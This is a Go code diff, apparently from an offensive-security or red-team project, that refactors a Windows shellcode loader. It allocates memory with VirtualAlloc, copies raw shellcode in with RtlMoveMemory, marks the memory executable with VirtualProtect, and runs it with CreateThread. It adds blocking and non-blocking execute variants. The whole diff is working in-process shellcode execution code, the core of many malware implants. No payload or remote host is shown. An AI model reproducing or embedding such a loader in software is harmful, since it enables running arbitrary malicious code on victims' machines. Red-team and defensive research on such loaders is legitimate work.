@@ -8,22 +8,109 @@ import (
 	"unsafe"
 )
 
+var kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+
+// Execute runs a shellcode on a thread without locking the execution
 func Execute(shellcode []byte) error {
 	defer func() {
 		if r := recover(); r != nil {
 			fmt.Println("ShellCode Execution died")
 		}
 	}()
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+
+	address, sErr := shellCodeAddress(shellcode)
+	if sErr != nil {
+		return sErr
+	}
+
+	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+	// Creates a thread to execute within the virtual address space of the calling process.
+	createThread := kernel32.NewProc("CreateThread")
+	/* C++
+	HANDLE CreateThread(
+	  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+	  [in]            SIZE_T                  dwStackSize,
+	  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
+	  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
+	  [in]            DWORD                   dwCreationFlags,
+	  [out, optional] LPDWORD                 lpThreadId
+	);
+	*/
+
+	var thIdentifier uintptr
+	_, _, thErr := createThread.Call(
+		0,            // NULL security attributes
+		0,            // size of the stack (default executable size)
+		address,      // pointer to address of our reserved memory
+		uintptr(0),   // pointer to a variable passed to the thread
+		0,            // tell to run after creation
+		thIdentifier, // pointer to a variable that receives the thread identifier
+	)
+	// An error is always expected
+	if thErr.Error() != "The operation completed successfully." {
+		return fmt.Errorf("failed to execute thread: %v", thErr)
+	}
+
+	return nil
+}
+
+// LocalExecute is identical to Execute but waits until the thread execution ends
+func LocalExecute(shellcode []byte) error {
+	defer func() {
+		if r := recover(); r != nil {
+			fmt.Println("ShellCode Execution died")
+		}
+	}()
+	address, sErr := shellCodeAddress(shellcode)
+	if sErr != nil {
+		return sErr
+	}
+
+	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+	// Creates a thread to execute within the virtual address space of the calling process.
+	createThread := kernel32.NewProc("CreateThread")
+	/* C++
+	HANDLE CreateThread(
+	  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+	  [in]            SIZE_T                  dwStackSize,
+	  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
+	  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
+	  [in]            DWORD                   dwCreationFlags,
+	  [out, optional] LPDWORD                 lpThreadId
+	);
+	*/
+
+	var thIdentifier uintptr
+	thread, _, thErr := createThread.Call(
+		0,            // NULL security attributes
+		0,            // size of the stack (default executable size)
+		address,      // pointer to address of our reserved memory
+		uintptr(0),   // pointer to a variable passed to the thread
+		0,            // tell to run after creation
+		thIdentifier, // pointer to a variable that receives the thread identifier
+	)
+	// An error is always expected
+	if thErr.Error() != "The operation completed successfully." {
+		return fmt.Errorf("failed to execute thread: %v", thErr)
+	}
+
+	// Wait forever
+	_, wErr := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFF)
+
+	return wErr
+}
+
+func shellCodeAddress(shellcode []byte) (uintptr, error) {
+	defer func() {
+		if r := recover(); r != nil {
+			fmt.Println("ShellCode Execution died")
+		}
+	}()
 
 	// https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
 	// Copies the contents of a source memory block to a destination memory block, and supports overlapping
 	// source and destination memory blocks.
 	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
-
-	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
-	// Creates a thread to execute within the virtual address space of the calling process.
-	createThread := kernel32.NewProc("CreateThread")
 
 	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
 	// Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.
@@ -44,7 +131,7 @@ func Execute(shellcode []byte) error {
 		windows.PAGE_READWRITE,
 	)
 	if vErr != nil {
-		return fmt.Errorf("failed to reserve memory: %v", vErr)
+		return uintptr(0), fmt.Errorf("failed to reserve memory: %v", vErr)
 	}
 
 	/* C++
@@ -81,36 +168,7 @@ func Execute(shellcode []byte) error {
 		windows.PAGE_EXECUTE_READ,
 		&oldProtect,
 	); vpErr != nil {
-		return fmt.Errorf("failed to change virtuall address protection: %v", vpErr)
+		return uintptr(0), fmt.Errorf("failed to change virtuall address protection: %v", vpErr)
 	}
-
-	/* C++
-	HANDLE CreateThread(
-	  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
-	  [in]            SIZE_T                  dwStackSize,
-	  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
-	  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
-	  [in]            DWORD                   dwCreationFlags,
-	  [out, optional] LPDWORD                 lpThreadId
-	);
-	*/
-
-	var thIdentifier uintptr
-	thread, _, thErr := createThread.Call(
-		0,            // NULL security attributes
-		0,            // size of the stack (default executable size)
-		address,      // pointer to address of our reserved memory
-		uintptr(0),   // pointer to a variable passed to the thread
-		0,            // tell to run after creation
-		thIdentifier, // pointer to a variable that receives the thread identifier
-	)
-	// An error is always expected
-	if thErr.Error() != "The operation completed successfully." {
-		return fmt.Errorf("failed to execute thread: %v", thErr)
-	}
-
-	// Wait forever
-	_, wErr := windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFF)
-
-	return wErr
+	return address, nil
 }
